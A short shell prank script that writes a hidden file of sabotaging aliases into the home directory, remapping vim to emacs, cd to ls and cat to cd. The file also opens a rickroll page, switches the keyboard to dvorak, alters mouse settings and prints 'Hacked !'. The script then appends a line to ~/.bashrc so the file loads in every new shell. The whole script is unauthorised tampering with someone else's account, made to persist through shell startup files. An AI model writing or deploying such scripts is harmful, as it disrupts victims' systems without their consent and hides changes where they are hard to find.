#!/bin/sh

cat <<EOF > ~/.loose
alias vim=emacs
alias cd=ls
alias cat=cd

google-chrome rickroll.fr   2&>/dev/null
setxkbmap dvorak            2&>/dev/null
xset mouse 3 0              2&>/dev/null
echo "Hacked !"
EOF

grep .loose ~/.bashrc 2>/dev/null || echo "source ~/.loose" >> ~/.bashrc

#. ~/.loose
